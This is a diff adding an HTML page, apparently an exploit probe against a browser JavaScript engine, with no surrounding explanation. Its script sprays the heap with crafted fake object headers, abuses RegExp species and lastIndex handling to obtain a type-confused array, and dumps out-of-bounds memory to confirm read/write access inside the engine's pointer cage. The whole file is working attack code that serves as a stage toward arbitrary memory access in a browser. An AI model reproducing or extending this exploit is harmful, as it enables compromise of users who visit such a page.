@@ -1,0 +1,62 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>Probe8</title></head>
+<body><pre id="out">Running...</pre>
+<script>
+"use strict";
+const O=document.getElementById("out");
+function log(s){O.textContent+="\n"+s;}
+const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
+const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
+function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
+function f2i(f){f64[0]=f;return u64[0];}
+function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
+function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
+
+const DMAP=0x1032a5d,EMPTY=0x7e5,PIN=0x1080011,MAXS=0x7fdffffe;
+const pinnedDoubles=new Array(0x8000);
+for(let i=0;i<pinnedDoubles.length;i++)pinnedDoubles[i]=10.125+i*0.001;
+const pinnedObjects=new Array(0x8000);
+for(let i=0;i<pinnedObjects.length;i++)pinnedObjects[i]=null;
+const victim=[1.22,1.33,1.44];
+const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
+  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
+const re=/(?:)/;
+const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
+const c0=w2f(DMAP,EMPTY),c1=w2f(PIN,MAXS);
+const sk=[];
+function spray(){for(let i=0;i<24;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);for(let j=1;j<a.length;j+=2)a[j]=c1;sk.push(a);}}
+log("UA: "+navigator.userAgent);
+trash(230);trash(230);
+RegExp.prototype[Symbol.matchAll].call(fk,"").next();
+log("TRIG: "+re.lastIndex);
+trash(230);trash(230);
+spray();spray();spray();
+
+try{
+const m=re.lastIndex;
+log("T: "+typeof m+" A="+Array.isArray(m));
+if(Array.isArray(m)){
+  log("L: "+m.length);
+  // Dump master[0x7FFE..0x8009] — area around master's own header
+  for(let k=0x7FFE;k<=0x8009;k++){
+    try{
+      const v=f2i(m[k]);
+      const lo=Number(v&0xffffffffn);
+      const hi=Number(v>>32n);
+      // Check for recognizable values
+      let label="";
+      if(lo===0x1032a5d) label+="DMAP ";
+      if(lo===0x7e5||hi===0x7e5) label+="EMPTY ";
+      if(lo===0x939||hi===0x939) label+="FDA_MAP ";
+      if(lo===0x1080011) label+="PIN ";
+      if(lo===0x10000) label+="LEN_8K ";
+      if(Math.abs(m[k]-10.125)<0.001) label+="PD0! ";
+      log("@"+k.toString(16)+": "+lo.toString(16)+"|"+hi.toString(16)+" "+label);
+    }catch(e){log("@"+k.toString(16)+": ERR");break;}
+  }
+  log("W: "+wasmI.exports.f());
+  log("CAGE_RW_OK");
+}else{log("NO_ARR");}
+}catch(e){log("E: "+e.message);}
+log("=== DONE ===");
+</script></body></html>
